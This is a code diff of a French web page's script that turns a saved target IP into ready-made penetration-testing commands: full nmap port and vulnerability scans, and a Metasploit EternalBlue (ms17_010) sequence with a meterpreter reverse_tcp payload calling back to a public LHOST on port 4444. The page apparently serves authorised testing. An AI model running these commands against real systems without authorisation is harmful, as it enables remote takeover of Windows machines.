@@ -105,33 +105,33 @@
             const savedWord = localStorage.getItem('savedWord');
             if (savedWord) {
                 document.getElementById('savedWord').textContent = savedWord;
-                // Remplacer le mot dans les commandes par le mot sauvegardé
-                updateCommands(savedWord);
+                updateCommands(savedWord); // Mettre à jour les commandes
             }
         });
 
         // Sauvegarder le mot dans localStorage et mettre à jour les commandes
         function saveWord() {
             const word = document.getElementById('wordInput').value;
-            localStorage.setItem('savedWord', word);
-            document.getElementById('savedWord').textContent = word;
-            updateCommands(word);  // Met à jour les commandes avec le mot sauvegardé
+            if (word.trim() !== "") {
+                localStorage.setItem('savedWord', word);
+                document.getElementById('savedWord').textContent = word;
+                updateCommands(word);  // Met à jour les commandes avec le mot sauvegardé
+            } else {
+                alert("Veuillez entrer un mot.");
+            }
         }
 
         // Fonction pour mettre à jour les commandes avec le mot sauvegardé
         function updateCommands(word) {
-            const commands = [
-                { id: 'ipCommand', command: 'ip route | grep default' },
-                { id: 'nmapCommand', command: 'nmap -p 1-65535 -sV ' },
-                { id: 'nmapVulnCommand', command: 'nmap --script vuln ' },
-                { id: 'metasploitCommand', command: 'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS ' }
-            ];
+            // Récupération des éléments de commande
+            const nmapCommand = document.getElementById('nmapCommand');
+            const nmapVulnCommand = document.getElementById('nmapVulnCommand');
+            const metasploitCommand = document.getElementById('metasploitCommand');
 
-            commands.forEach(function(command) {
-                const commandElement = document.getElementById(command.id);
-                let updatedCommand = command.command.replace('[adresse_ip_du_client]', word).replace('[adresse_ip_du_serveur]', word);
-                commandElement.textContent = updatedCommand;
-            });
+            // Mise à jour des commandes en remplaçant les espaces réservés par le mot sauvegardé
+            nmapCommand.textContent = `nmap -p 1-65535 -sV ${word}`;
+            nmapVulnCommand.textContent = `nmap --script vuln ${word}`;
+            metasploitCommand.textContent = `msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS ${word}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST [votre_ip_publique]\nset LPORT 4444\nrun`;
         }
     </script>
 
